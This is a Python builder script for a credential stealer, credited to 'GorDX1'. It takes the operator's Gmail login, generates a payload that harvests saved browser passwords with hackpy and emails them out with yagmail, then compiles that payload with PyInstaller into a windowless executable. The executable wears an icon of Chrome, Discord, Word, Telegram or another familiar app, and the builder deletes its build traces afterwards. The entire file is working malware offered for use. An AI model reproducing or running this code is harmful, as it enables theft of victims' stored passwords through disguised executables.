import yagmail
import colorama
from termcolor import colored
from os import system
from platform import platform
from time import sleep
import os


colorama.init()

os = platform()[0], platform()[1],  platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]

if os == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
    delet = 'cls'
    dr = '\\'
    build_delet = 'RMDIR /S /Q build'
    cash_delet = 'RMDIR /S /Q __pycache__'
    file1_delet = 'del stealer.spec'
    file2_delet = 'del stealer.py'
else:
    build_delet = 'rm -r build'
    cash_delet = 'rm -r __pycache__'
    file1_delet = 'rm -r stealer.spec'
    file2_delet = 'rm -r stealer.py'
    delet = 'clear'
    dr = '/'


cr_Stealer = """
_$$$$___$$$$$___$$$$$____$$$$___$$$$$$___$$$$___$$$$$
$$__$$__$$__$$__$$______$$__$$____$$____$$__$$__$$__$$
$$______$$$$$___$$$$____$$$$$$____$$____$$__$$__$$$$$
$$__$$__$$__$$__$$______$$__$$____$$____$$__$$__$$__$$
_$$$$___$$__$$__$$$$$___$$__$$____$$_____$$$$___$$__$$

_$$$$___$$$$$$__$$$$$____$$$$___$$______$$$$$___$$$$$
$$________$$____$$______$$__$$__$$______$$______$$__$$
_$$$$_____$$____$$$$____$$$$$$__$$______$$$$____$$$$$
____$$____$$____$$______$$__$$__$$______$$______$$__$$
_$$$$_____$$____$$$$$___$$__$$__$$$$$$__$$$$$___$$__$$		
"""

vr = """
 ____________________________________________________
|                                                    |
| [--] Created by: GorDX1                            |
|                                                    |
| [--] GitHub: https://github.com/GorDX1             | 
|                                                    |
| [--] Telegram channel: @XakerInfo                  |
|                                                    |
| [--] Version: 1.2.0                                |
|____________________________________________________|
"""

icn = """
     _______________________________________________
    |                                               |
    |  [1] Opera                                    |
    |  [2] Chrome                                   |
    |  [3] Discord                                  |
    |  [4] Micrasoft Power Point                    |
    |  [5] Micrasoft  Word                          |
    |  [6] Telegram                                 |
    |  [7] WinRAR                                   |
    |  [8] Torrent                                  |
    |  [9] Choose your icon                         |
    |_______________________________________________|
"""

def load5():
    print(colored('Loading.', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading..', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading...', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading.', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading..', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading...', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading.', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading..', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading...', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading.', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading..', 'green'))
    sleep(0.5)
    system(delet)
    print(colored('Loading...', 'green'))
    sleep(0.5)   
    system(delet)

def created_stealer():
    system(delet)

    print(colored(cr_Stealer, 'green'))

    print(colored('Only works with Gmail', 'red'))
    print()
    email = input(colored('Enter Email: ', 'blue'))
    passwrd = input(colored('Enter email password: ', 'blue'))
    system(delet)
    print(colored(icn, 'red'))
    print()
    print(colored("Select application icon", 'red'))
    icon = int(input(colored('=> ', 'blue')))



    if icon == 1:
        ico = 'builder'+dr+'opera.ico'
    elif icon == 2:
        ico = 'builder'+dr+'chrome.ico'
    elif icon == 3:
        ico = 'builder'+dr+'discord.ico'
    elif icon == 4:
        ico = 'builder'+dr+'point.ico'
    elif icon == 5:
        ico = 'builder'+dr+'word.ico'
    elif icon == 6:
        ico = 'builder'+dr+'telegram.ico'
    elif icon == 7:
        ico = 'builder'+dr+'winrar.ico'
    elif icon == 8:
        ico = 'builder'+dr+'torrent.ico'   
    elif icon == 9:
        system(delet)
        ico = input(colored('Enter the path to the icon: ', 'blue'))

    code = 'login = '+"'"+email+"'"+'\n'+'password = '+"'"+passwrd+"'"+"""

import yagmail
from hackpy.passwords import *

f = open('D:\\log.txt', 'w')

for key, account in passwordsRecovery():
           passw = '['  + str(key) + ']'+'|SITE: ' + account['url'] + '|USER: ' + account['login'] + '|PASS: ' + account['password']
           f.write(passw)
f.close()
receiver = login
body = 'Passwords'
filename = 'D:\\log.txt'

yag = yagmail.SMTP(login, password)
yag.send(
    to=receiver,
    subject="Passwords",
    contents=body, 
    attachments=filename,
    )
    """

    f = open('stealer.py', mode = 'w', encoding='utf-8')
    f.close()
    bk = open('stealer.py',  mode = 'a', encoding='utf-8')
    bk.write(code)
    bk.close()
    load5()
    system('cd builder')
    system('pyinstaller -F --noconsole -i '+ico+' stealer.py')
    system('cd..')
    system(cash_delet)
    system(build_delet)
    system(file1_delet)
    system(file2_delet)
    print(colored('The stealer.exe file is saved in the "dist" folder', 'green'))
    print()
    print(colored('Press Enter', 'green'))
    input()

created_stealer()
